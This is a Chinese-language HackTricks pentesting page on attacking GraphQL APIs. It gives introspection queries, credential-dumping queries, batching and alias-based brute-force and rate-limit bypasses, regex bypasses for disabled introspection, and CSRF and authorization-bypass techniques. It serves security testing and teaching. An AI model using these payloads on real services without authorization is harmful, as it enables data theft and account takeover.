# GraphQL

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 介绍

GraphQL是REST API的替代方案。REST API要求客户端向API的不同端点发送多个请求，以从后端数据库查询数据。而使用GraphQL，您只需要发送一个请求来查询后端。这样做更简单，因为您不需要向API发送多个请求，一个请求就可以获取所有必要的信息。

## GraphQL

随着新技术的出现，新的漏洞也会出现。**默认情况下**，GraphQL**不实现身份验证**，这由开发人员来实现。这意味着默认情况下，GraphQL允许任何人查询它，任何敏感信息都将对未经身份验证的攻击者可用。

在执行目录暴力攻击时，请确保添加以下路径以检查GraphQL实例。

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

<figure><img src="../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

一旦找到一个开放的GraphQL实例，您需要知道**它支持哪些查询**。这可以通过使用内省系统来完成，更多详细信息可以在这里找到：[**GraphQL：用于API的查询语言。**\
询问GraphQL模式有关其支持的查询的信息通常很有用。GraphQL允许我们这样做...](https://graphql.org/learn/introspection/)

### 指纹识别

工具[**graphw00f**](https://github.com/dolevf/graphw00f)能够检测服务器中使用的GraphQL引擎，然后为安全审计人员提供一些有用的信息。

#### 通用查询 <a href="#universal-queries" id="universal-queries"></a>

如果您向任何GraphQL端点发送`query{__typename}`，它将在其响应中包含字符串`{"data": {"__typename": "query"}}`。这被称为通用查询，是探测URL是否对应于GraphQL服务的有用工具。

该查询有效是因为每个GraphQL端点都有一个名为`__typename`的保留字段，它以字符串形式返回查询对象的类型。

### 基本枚举

GraphQL通常支持**GET**，**POST**（x-www-form-urlencoded）和**POST**（json）。为了安全起见，建议只允许使用json以防止CSRF攻击。

#### 内省

要使用内省来发现模式信息，请查询`__schema`字段。该字段在所有查询的根类型上可用。
```bash
query={__schema{types{name,fields{name}}}}
```
使用此查询，您将找到正在使用的所有类型的名称：

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

使用此查询，您可以提取所有类型、字段和参数（以及参数的类型）。这对于了解如何查询数据库非常有用。

![](<../../.gitbook/assets/image (207) (3).png>)

**错误**

了解**错误**是否会被**显示**是很有趣的，因为它们会提供有用的**信息**。
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**通过内省枚举数据库模式**

{% hint style="info" %}
如果启用了内省但上述查询无法运行，请尝试从查询结构中删除 `onOperation`、`onFragment` 和 `onField` 指令。
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
内联内省查询：

```graphql
{
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
      onOperation
      onFragment
      onField
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                        ofType {
                          kind
                          name
                          ofType {
                            kind
                            name
                            ofType {
                              kind
                              name
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

这是一个内联内省查询：

```graphql
{
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
      onOperation
      onFragment
      onField
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                        ofType {
                          kind
                          name
                          ofType {
                            kind
                            name
                            ofType {
                              kind
                              name
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
最后一行代码是一个GraphQL查询，它将从GraphQL中转储所有的元信息（对象名称、参数、类型...）。

![](<../../.gitbook/assets/image (206).png>)

如果启用了内省功能，您可以使用[**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager)在GUI中查看所有选项。

### 查询

现在我们知道数据库中保存了哪些类型的信息，让我们尝试**提取一些值**。

在内省中，您可以找到可以直接查询的**对象类型**（因为您不能仅仅因为它存在就查询一个对象）。在下面的图像中，您可以看到"_queryType_"被称为"_Query_"，而"_Query_"对象的一个字段是"_flags_"，它也是一个对象类型。因此，您可以查询flag对象。

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

请注意，查询"_flags_"的类型是"_Flags_"，并且该对象定义如下：

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

您可以看到"_Flags_"对象由**名称**和**值**组成。然后，您可以使用以下查询获取所有标志的名称和值：
```javascript
query={flags{name, value}}
```
请注意，如果要查询的对象是像以下示例中的字符串这样的原始类型

![](<../../.gitbook/assets/image (441).png>)

您可以使用以下查询：
```javascript
query={hiddenFlags}
```
在另一个例子中，"_Query_" 类型对象中有两个对象："_user_" 和 "_users_"。如果这些对象不需要任何参数来搜索，可以通过请求所需的数据来检索它们的所有信息。在这个例子中，你可以提取保存的用户名和密码：

![](<../../.gitbook/assets/image (208).png>)

然而，在这个例子中，如果你尝试这样做，你会得到这个错误：

![](<../../.gitbook/assets/image (210).png>)

看起来它会使用类型为 _Int_ 的 "_**uid**_" 参数进行搜索。无论如何，我们已经知道，在[基本枚举](graphql.md#basic-enumeration)部分提出了一个查询，显示了我们所需的所有信息：`query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

如果你阅读我运行该查询时提供的图像，你会发现 "_**user**_" 有一个类型为 _Int_ 的 "_**uid**_" 参数。

因此，通过进行一些轻量级的 _**uid**_ 强制破解，我发现在 _**uid**=**1**_ 中检索到了一个用户名和一个密码：\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

请注意，我**发现**我可以请求 "_**user**_" 和 "_**password**_" 这些参数，因为如果我尝试查找不存在的内容 (`query={user(uid:1){noExists}}`)，我会得到这个错误：

![](<../../.gitbook/assets/image (213).png>)

在**枚举阶段**期间，我发现 "_**dbuser**_" 对象的字段是 "_**user**_" 和 "_**password**_"。

**查询字符串转储技巧（感谢 @BinaryShadow\_）**

如果你可以通过字符串类型进行搜索，比如：`query={theusers(description: ""){username,password}}`，并且你搜索一个空字符串，它将**转储所有数据**。（_请注意，此示例与教程示例无关，对于此示例，假设你可以使用名为 "**theusers**" 的字符串字段 "**description**" 进行搜索_）。

GraphQL 是一项相对较新的技术，正在开始在初创公司和大型企业中获得一些关注。除了默认缺少身份验证外，GraphQL 端点可能还容易受到其他错误的影响，例如 IDOR。

### 搜索

对于这个例子，想象一个由电子邮件和姓名标识的**人**的数据库，以及由名称和评分标识的**电影**。一个**人**可以与其他**人**成为**朋友**，一个人可以**拥有电影**。

你可以通过**姓名**搜索人，并获取他们的电子邮件：
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
您可以通过姓名搜索人员并获取他们订阅的电影：
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
请注意，这里指示要获取个人的`subscribedMovies`的`name`。

您还可以**同时搜索多个对象**。在这种情况下，进行了搜索2部电影：
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
甚至可以使用别名来建立多个不同对象之间的关系：
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations（变异）

**变异用于在服务器端进行更改。**

在**内省**中，您可以找到**声明的** **变异**。在下面的图像中，"_MutationType_" 被称为 "_Mutation_"，"_Mutation_" 对象包含变异的名称（在本例中为 "_addPerson_"）：

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

对于这个例子，假设有一个由电子邮件和姓名标识的**人员**数据库和由名称和评分标识的**电影**。一个**人员**可以与其他**人员**成为**朋友**，一个人可以**拥有电影**。

在数据库中创建新电影的变异可以如下所示（在本例中，变异被称为 `addMovie`）：
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**注意查询中同时指示了数据的值和类型。**

还可能有一个**mutation**来**创建**人员（在这个例子中称为`addPerson`），并且有朋友和文件（请注意，在创建与它们相关的人员之前，朋友和电影必须存在）：
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### 在一个API请求中批量进行暴力破解

这些信息来自于[https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)。通过**同时发送多个带有不同凭证的查询**来进行GraphQL API的身份验证。这是一种经典的暴力破解攻击，但现在由于GraphQL的批处理功能，可以在一个HTTP请求中发送多个登录/密码对。这种方法会欺骗外部速率监控应用程序，让它们认为一切正常，没有暴力破解机器人试图猜测密码。

下面是一个应用程序身份验证请求的最简单演示，每次同时发送**3个不同的电子邮件/密码对**。显然，可以以相同的方式在单个请求中发送数千个：

![](<../../.gitbook/assets/image (182) (1).png>)

从响应截图中可以看出，第一个和第三个请求返回了_null_并在_error_部分反映了相应的信息。**第二个mutation具有正确的身份验证**数据，响应中包含了正确的身份验证会话令牌。

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL无内省

越来越多的**GraphQL端点禁用了内省**。然而，当收到意外请求时，GraphQL抛出的错误足以让像[**clairvoyance**](https://github.com/nikitastupin/clairvoyance)这样的工具重新创建大部分模式。

此外，Burp Suite扩展程序[**GraphQuail**](https://github.com/forcesunseen/graphquail)扩展程序**观察通过Burp传递的GraphQL API请求**并**构建**一个内部的GraphQL**模式**，每次看到一个新的查询时。它还可以为GraphiQL和Voyager公开模式。当收到内省查询时，该扩展程序返回一个虚假的响应。因此，GraphQuail显示了API中可用于使用的所有查询、参数和字段。有关更多信息，请[**查看此处**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema)。

### 绕过GraphQL内省防御 <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

如果无法运行针对正在测试的API的内省查询，请尝试在`__schema`关键字之后插入**特殊字符**。

当开发人员禁用内省时，他们可能会使用正则表达式来排除查询中的`__schema`关键字。您应该尝试像**空格**、**换行符**和**逗号**这样的字符，因为它们被GraphQL忽略，但不被有缺陷的正则表达式忽略。

因此，如果开发人员只排除了`__schema{`，那么下面的内省查询将不会被排除。
```bash
#Introspection query with newline
{
"query": "query{__schema
{queryType{name}}}"
}
```
如果这个方法不起作用，尝试使用其他请求方法运行探针，因为introspection可能只在POST请求中被禁用。尝试使用GET请求，或者使用`x-www-form-urlencoded`作为content-type的POST请求。

### 泄露的GraphQL结构

如果introspection被禁用，尝试查看网站源代码。这些查询通常作为JavaScript库预加载到浏览器中。这些预先编写的查询可以揭示关于每个对象和函数的模式和使用的强大信息。开发者工具的`Sources`选项卡可以搜索所有文件以枚举查询保存的位置。有时甚至已经暴露了受管理员保护的查询。
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQL中的CSRF

如果你不知道什么是CSRF，请阅读以下页面：

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

在那里，你将能够找到几个**没有配置CSRF令牌**的GraphQL端点。

请注意，GraphQL请求通常通过使用Content-Type为**`application/json`**的POST请求发送。
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
然而，大多数GraphQL端点也支持**`form-urlencoded` POST请求：**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
因此，由于类似之前的CSRF请求是**不需要预检请求**的，因此可以通过CSRF滥用对GraphQL进行**更改**。

但是，请注意，Chrome的`samesite`标志的新默认cookie值是`Lax`。这意味着该cookie仅在GET请求中从第三方网站发送。

请注意，通常也可以将**查询请求**作为**GET请求**发送，并且在GET请求中可能不会验证CSRF令牌。

此外，滥用[**XS-Search**](../../pentesting-web/xs-search.md)**攻击**可能会利用用户的凭据从GraphQL端点窃取内容。

有关更多信息，请查看[**此处的原始帖子**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)。

## GraphQL中的授权

端点上定义的许多GraphQL函数可能仅检查请求者的身份验证，而不检查授权。

修改查询输入变量可能导致敏感账户详细信息的[泄露](https://hackerone.com/reports/792927)。

甚至可以通过修改其他账户数据来实现账户接管。
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### 绕过GraphQL的授权

通过链接查询可以绕过弱身份验证系统。

在下面的示例中，您可以看到操作是"forgotPassword"，它应该只执行与之关联的forgotPassword查询。但是，我们可以通过在末尾添加一个查询来绕过此限制，例如在这种情况下，我们添加了"register"和一个用户变量，系统将其注册为新用户。

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## 使用别名绕过速率限制

通常情况下，GraphQL对象不能包含具有相同名称的多个属性。别名允许您通过**显式命名要返回的属性**来绕过此限制。您可以使用别名在一个请求中返回**同一类型的多个**对象实例。

有关GraphQL别名的更多信息，请参见[别名](https://portswigger.net/web-security/graphql/what-is-graphql#aliases)。

虽然别名旨在减少您需要进行的API调用次数，但它们也可以用于暴力破解GraphQL端点。

许多端点都会有某种**速率限制器来防止暴力破解攻击**。某些速率限制器基于接收到的**HTTP请求的数量**而不是在端点上执行的操作数量。因为别名有效地使您能够在单个HTTP消息中发送多个查询，所以它们可以绕过此限制。

下面的简化示例显示了一系列**别名查询，检查商店折扣代码是否有效**。这个操作可能会绕过速率限制，因为它只是一个HTTP请求，即使它可能用于一次性检查大量的折扣代码。
```bash
#Request with aliased queries
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## 工具

### 漏洞扫描器

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler)：可以用来获取模式并搜索敏感数据，测试授权，暴力破解模式，并找到到达给定类型的路径的工具包。
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html)：可以作为独立工具或[Burp扩展](https://github.com/doyensec/inql)使用。
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap)：也可以作为CLI客户端用于自动化攻击。
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum)：列出在GraphQL模式中到达给定类型的不同方式的工具。

### 客户端

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql)：GUI客户端
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/)：GUI客户端

### 自动化测试

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* 解释AutoGraphQL的视频：[https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## 参考资料

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
